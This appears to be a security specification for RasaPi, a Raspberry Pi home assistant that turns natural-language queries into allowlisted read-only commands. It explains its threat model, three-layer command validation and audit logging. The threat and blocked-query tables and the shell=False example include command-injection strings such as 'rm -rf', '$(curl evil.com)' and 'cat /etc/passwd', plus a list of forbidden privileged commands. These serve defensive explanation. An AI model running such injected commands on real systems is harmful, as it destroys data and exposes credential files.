# RasaPi — Security Model

This document is the security spec for the running Phase 1 codebase. Every claim here is enforced by code in `backend/security/` and `backend/core/`, and verified by tests in `tests/`.

---

## Threat model

RasaPi runs on a home network and accepts natural-language input that, by design, can trigger system commands. The threats that drive Phase 1's design:

| Threat | Source | Mitigation in Phase 1 |
|---|---|---|
| **Prompt / query injection** | Crafted input like `"hello; rm -rf /"` | Three-layer command pipeline; raw query never reaches a shell |
| **Command injection** | Argument designed to break out of `subprocess` | `shell=False`, args passed as list, no string concatenation |
| **Privilege escalation** | Query asks for `sudo …` | `sudo` is not on the allowlist and never will be |
| **Unknown-command fishing** | Query attempts to invoke arbitrary binary | Allowlist is a closed dict; missing key = rejected |
| **Argument abuse** | Allowed command with a destructive flag | Each command declares its allowed args explicitly |
| **Audit-log tampering** | Attacker writes false entries | Append-only writes; daily rotation; future phase: signing |
| **Credential leakage** | Secrets in logs or error messages | Audit log writes only declared fields; `.env` gitignored |
| **Unauthorized API access** | External LAN host hits `/ask` | API secret key support exists; LAN-only binding recommended (Phase 5 hardens this) |
| **Cloud data exfiltration** | Unintended outbound call | No cloud client imported in Phase 1; Ollama is `localhost` only |

---

## Three-layer command safety model

This is the heart of Phase 1. Every command execution passes **three independent layers**. Each layer is defensive on its own; together they make any single bug insufficient to produce a compromise.

```
   query
     │
     ▼
   ┌──────────────────────────────────────────┐
   │  LAYER 1  — Intent Router                │
   │  Closed keyword set; everything else     │
   │  becomes "fallback" and exits early.     │
   └────────────────────┬─────────────────────┘
                        │  matched intent → (cmd, args)
                        ▼
   ┌──────────────────────────────────────────┐
   │  LAYER 2  — Allowlist Validator          │
   │  cmd must be a key in ALLOWED_COMMANDS;  │
   │  args must satisfy max_args + allow set. │
   └────────────────────┬─────────────────────┘
                        │  validated
                        ▼
   ┌──────────────────────────────────────────┐
   │  LAYER 3  — subprocess(shell=False)      │
   │  Args as Python list; no shell parsing;  │
   │  10-second timeout; output captured.     │
   └──────────────────────────────────────────┘
                        │
                        ▼
                     stdout
```

### Layer 1 — Intent router (`core/intent_router.py`)

A tuple of `Intent` objects, each carrying a fixed set of trigger keywords. The query is lowercased and stripped, then checked against keywords with `in` substring matching. **No regex, no fuzzy matching, no model.** Anything that doesn't match a known intent returns `RouteResult(intent="fallback", …)` and never invokes a command runner.

This layer's purpose: turn an open-ended natural language input into one of a finite, pre-approved set of actions before any executor sees it.

### Layer 2 — Allowlist validator (`security/allowlist.py`)

```python
ALLOWED_COMMANDS: dict[str, CommandSpec] = {
    "uptime":   CommandSpec(max_args=0),
    "date":     CommandSpec(max_args=0),
    "hostname": CommandSpec(max_args=0),
    "uname":    CommandSpec(max_args=1, allowed_args=["-a","-r","-m","-s"]),
    "df":       CommandSpec(max_args=1, allowed_args=["-h"]),
    "free":     CommandSpec(max_args=1, allowed_args=["-h","-m"]),
    "vcgencmd": CommandSpec(max_args=1, allowed_args=[
        "measure_temp", "get_throttled", "measure_clock arm",
    ]),
    "ip":       CommandSpec(max_args=1, allowed_args=["addr"]),
}
```

**Default deny.** A command not in the dict raises `ValidationError`. An argument not in `allowed_args` raises `ValidationError`. Argument count above `max_args` raises `ValidationError`. There is no fallback, no partial match, no wildcard.

### Layer 3 — `subprocess(shell=False)` (`core/command_runner.py`)

```python
subprocess.run(
    [command, *args],   # list, not a string
    capture_output=True,
    text=True,
    timeout=10,
    shell=False,        # no /bin/sh
)
```

When `shell=False` and args are a list, the OS executes exactly the binary at `command` with exactly those argv values. Shell metacharacters lose their meaning:

- `; rm -rf /` becomes a single literal argument
- `$(curl evil.com)` is never expanded
- `> /etc/passwd` is just text
- Pipes, globs, backticks are inert

A 10-second timeout caps any runaway process.

---

## What is allowed (Phase 1)

| Command | Args allowed | Purpose |
|---|---|---|
| `uptime` | none | How long the device has been running |
| `date` | none | Current date and time |
| `hostname` | none | Device hostname |
| `uname` | one of `-a -r -m -s` | Kernel / OS info |
| `df` | `-h` | Disk usage, human-readable |
| `free` | one of `-h -m` | Memory usage |
| `vcgencmd` | one of `measure_temp`, `get_throttled`, `measure_clock arm` | Pi-specific telemetry |
| `ip` | `addr` | Network interface info (read-only) |

**Common property:** every allowed command is read-only. Phase 1 cannot modify the system, even if every layer is defeated.

---

## What is blocked

Effectively everything else. Some examples that will never run, with the layer that catches them:

| Query | Caught by | Why |
|---|---|---|
| `rm -rf /` | Layer 1 (no matching intent) | "rm" not in any keyword set |
| `please run sudo apt update` | Layer 2 if router added it | `sudo` not in `ALLOWED_COMMANDS` |
| `df -h ; cat /etc/passwd` | Layer 3 | `;` is a literal character in the arg, not a separator |
| `df --output=source` | Layer 2 | `--output=source` not in `allowed_args` for `df` |
| `vcgencmd version` | Layer 2 | `version` not in `allowed_args` |
| `bash -c 'echo pwned'` | Layer 1 | "bash" not in any keyword set; even if it were, Layer 2 rejects |
| `curl https://evil.com` | Layer 1 | not a recognised intent |

Privileged commands — `sudo`, `su`, `chmod`, `chown`, `passwd`, `mkfs`, `dd` — are explicitly out of scope and will not be added to the allowlist in any phase.

---

## Why `shell=False` matters

The default `subprocess.run("df -h", shell=True)` invokes `/bin/sh -c "df -h"`. The shell parses metacharacters in the string, which is how 90% of real-world command-injection vulnerabilities happen. With `shell=False` and args as a Python list:

```python
# DANGEROUS — what we do NOT do
subprocess.run(f"df {user_input}", shell=True)
# user_input = "-h; rm -rf ~"  →  the shell runs both commands

# SAFE — what we do
subprocess.run(["df", user_input], shell=False)
# user_input = "-h; rm -rf ~"  →  df receives one argument literally
#                                  named "-h; rm -rf ~", complains, exits
```

Combined with the allowlist (Layer 2), this means even *valid* commands cannot be coerced into running adjacent commands.

---

## Audit logging behaviour

Every relevant event is appended as a single JSON line to `logs/audit-YYYY-MM-DD.jsonl`. Files rotate daily. Entries are append-only and never modified after writing.

### Event types

| `event_type` | Emitted when | Fields |
|---|---|---|
| `request` | `/ask` receives a query | `timestamp`, `request_id`, `query` (truncated to 500 chars) |
| `command_exec` | A command completes (success / error) | `timestamp`, `request_id`, `command`, `args`, `outcome`, `duration_ms` |
| `command_exec` (rejected) | Allowlist validator rejects | as above with `outcome="rejected"`, `reason` |
| `llm_call` | LLM stub invoked (Phase 2 will replace) | `timestamp`, `request_id`, `model`, `duration_ms` |

### Example entry

```json
{"timestamp":"2026-05-08T18:38:40Z","event_type":"command_exec","request_id":"0052765b-…","command":"date","args":[],"outcome":"allowed","duration_ms":3}
```

### What the log never contains

- `.env` values or `API_SECRET_KEY`
- Full process environment
- LLM model weights or system prompts containing PII
- Stack traces from internal errors (errors are summarised with a reason string)
- Anything that hasn't been declared in the schema above — the logger only emits known fields

### What the log can be used for

- Recruiter demo — show the immutable trail of every allowed and rejected command
- Forensic review — reconstruct a session by `request_id`
- Compliance posture — append-only logs are auditable in their raw form
- Phase 2 quality eval — when the LLM is added, every model decision is logged with the action it triggered

---

## Data residency

| Data | Where it lives | Leaves device? |
|---|---|---|
| Conversation queries | RAM during the request; truncated copy in JSONL | No |
| Audit log | Local filesystem (`logs/`) | No |
| Config / secrets | `.env` (gitignored) | No |
| LLM model weights (Phase 2) | Local filesystem (`models/`) | No |
| User reminders (Phase 3) | Local SQLite | No |

No data leaves the Pi unless a future phase explicitly opts the user in to a cloud feature. Phase 1 has no networked egress code paths.
